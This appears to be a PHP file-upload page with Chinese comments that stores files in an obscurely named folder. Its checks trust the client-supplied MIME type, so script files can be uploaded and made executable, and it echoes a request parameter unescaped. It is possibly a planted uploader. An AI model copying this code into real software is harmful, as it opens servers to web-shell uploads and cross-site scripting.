<?php
error_reporting(E_ERROR); 

ini_set("display_errors","Off");
//上传最大文件的大小。
$MAX_SIZE = 20000000;
                            
//设置允许的 Mime 类型. 
$FILE_MIMES = array('image/jpeg','image/jpg','image/gif'
                   ,'image/png','application/msword');

//设置允许的文件类型。请按照格式添加。            
$FILE_EXTS  = array('.dat'); 

//是否允许删除已上传的文件? no, 如果只允许上传。
$DELETABLE  = no;                               


//vvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvv
//  如果对代码不精通，请不要修改以下代码。
//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
/************************************************************
*     设置变量
************************************************************/
$site_name = $_SERVER['HTTP_HOST'];
$url_dir = "http://".$_SERVER['HTTP_HOST'].dirname($_SERVER['PHP_SELF']);
$url_this =  "http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'];

$upload_dir = "QwertyuioPabcdefg520/";
$upload_url = $url_dir."/QwertyuioPabcdefg520/";
$message ="";

/************************************************************
*     创建上传目录
************************************************************/
if (!is_dir("QwertyuioPabcdefg520")) {
  if (!mkdir($upload_dir))
   die ("upload_files directory doesn't exist and creation failed");
  if (!chmod($upload_dir,0755))
   die ("change permission to 755 failed.");
}

/************************************************************
*     用户请求进程
************************************************************/
if ($_REQUEST[del] && $DELETABLE)  {
	
  
  if (strpos($_REQUEST[del],"/.")>0);                  //可能遭到攻击
  else if (strpos($_REQUEST[del],"files/") === false); //可能遭到攻击
  else if (substr($_REQUEST[del],0,6)=="files/") {
    unlink($_REQUEST[del]);
    print "<script>window.location.href='$url_this?message=deleted successfully'</script>";
  }
}
else if ($_FILES['userfile']) {

$file_type = $_FILES['userfile']['type']; 
  $file_name = $_FILES['userfile']['name'];
  $file_ext = substr($file_name,strrpos($file_name,"."));

  //文件大小检查
  if ( $_FILES['userfile']['size'] > $MAX_SIZE) 
     $message = "The file size is over 2MB.";
  //文件类型/扩展名检查
  else if (!in_array($file_type, $FILE_MIMES) 
          && !in_array($file_ext, $FILE_EXTS) )
     $message = "Sorry, $file_name($file_type) is not allowed to be uploaded.";
  else
     $message = do_upload($upload_dir, $upload_url);
  
  print "<script>window.location.href='$url_this?message=$message'</script>";
}
else if (!$_FILES['userfile']);
else 
$message = "Invalid File Specified.";

/************************************************************
*     列出文件
************************************************************/
$handle=opendir($upload_dir);
$filelist = "";



function do_upload($upload_dir, $upload_url) {

$temp_name = $_FILES['userfile']['tmp_name'];
$file_name = $_FILES['userfile']['name']; 
  $file_name = str_replace("\\","",$file_name);
  $file_name = str_replace("'","",$file_name);
$file_path = $upload_dir.$file_name;

//文件名字检查
  if ( $file_name =="") { 
   $message = "Invalid File Name Specified";
   return $message;
  }

  $result  =  move_uploaded_file($temp_name, $file_path);
  if (!chmod($file_path,0755))
    $message = "change permission to 755 failed.";
  else
    $message = ($result)?"$file_name uploaded successfully." :
            "Somthing is wrong with uploading a file.";
  return $message;
}

?>

<center>
   <font color=red><?=$_REQUEST[message]?></font>
   <br>
   <form name="upload" id="upload" ENCTYPE="multipart/form-data" method="post">
     上传文件 <input type="file" id="userfile" name="userfile">
     <input type="submit" name="upload" value="上传">
   </form>
   
   <br><b>上传的文件</b>
   <hr width=70%>
   <?=$filelist?>
   <hr width=70%>
</center> 